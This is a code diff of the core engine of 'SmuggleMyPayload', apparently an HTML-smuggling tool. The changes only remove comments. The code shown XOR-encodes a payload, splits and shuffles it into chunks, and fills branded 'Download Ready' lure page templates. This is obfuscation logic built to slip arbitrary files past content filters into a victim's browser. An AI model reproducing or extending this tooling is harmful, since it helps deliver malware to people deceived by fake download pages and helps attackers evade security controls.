@@ -1,5 +1,5 @@
 """
-SmuggleMyPayload — Core Engine
+SmuggleMyPayload Core Engine
 Obfuscation, JS generation, and HTML build logic.
 
 Obfuscation layers:
@@ -83,16 +83,16 @@ def _split_csv_chunks(csv_str: str, max_size: int) -> list:
         if start + max_size >= len(csv_str):
             chunks.append(csv_str[start:])
             break
-        # Find the last comma at or before max_size boundary
+        
         end = csv_str.rfind(',', start, start + max_size)
         if end <= start:
-            # No comma found in range — take to next comma
+           
             end = csv_str.find(',', start + max_size)
             if end == -1:
                 chunks.append(csv_str[start:])
                 break
         chunks.append(csv_str[start:end])
-        start = end + 1  # skip the comma
+        start = end + 1  
     return chunks
 
 
@@ -168,25 +168,22 @@ def make_smuggle_js(payload_b64: str, filename: str) -> tuple:
     ]}
     safe_fn = sanitize_filename(filename)
 
-    # XOR encode the base64 payload
+    
     xor_key = random.randint(1, 254)
     xor_data = _xor_encode(payload_b64, xor_key)
 
-    # Split XOR'd data into chunks on comma boundaries (never mid-number)
+    
     xor_str = ','.join(str(x) for x in xor_data)
     chunk_size = _adaptive_chunk_size(len(payload_b64))
     raw_chunks = _split_csv_chunks(xor_str, chunk_size)
     num_chunks = len(raw_chunks)
 
-    # Create shuffled order for chunk placement
+    
     indices = list(range(num_chunks))
     shuffled = indices[:]
     random.shuffle(shuffled)
 
-    # Place raw chunks into shuffled positions
-    # ordered_chunks[shuffled[i]] = raw_chunks[i]
-    # To reconstruct: iterate shuffled as the order array
-    # JS does: chunks[order[i]] for i in 0..n -> raw_chunks[i]
+  
     ordered_chunks = [''] * num_chunks
     for i, si in enumerate(shuffled):
         ordered_chunks[si] = raw_chunks[i]
@@ -317,7 +314,7 @@ def build_html(template: str, payload_b64: str, filename: str,
 
     html = TEMPLATE_HTML.get(template, CUSTOM_HTML)
 
-    # Common replacements
+    
     replacements = {
         '__TITLE__': style.get('title', 'Download'),
         '__HEADING__': style.get('heading', 'Download Ready'),
@@ -336,7 +333,7 @@ def build_html(template: str, payload_b64: str, filename: str,
     for placeholder, value in replacements.items():
         html = html.replace(placeholder, value)
 
-    # Template-specific replacements
+    
     if template == '2':
         html = html.replace('__ACCENT2__', style.get('accent2', '#c5b358'))
     if template == '5':
@@ -351,7 +348,7 @@ def build_html(template: str, payload_b64: str, filename: str,
     if template == '7':
         html = html.replace('__LOGO_TEXT__', style.get('logo_text', 'Download Portal'))
 
-    # Resolve brand logo — custom image or default SVG
+    
     if logo_path and os.path.isfile(logo_path):
         h = LOGO_HEIGHT.get(template, 24)
         data_uri = encode_image(logo_path)
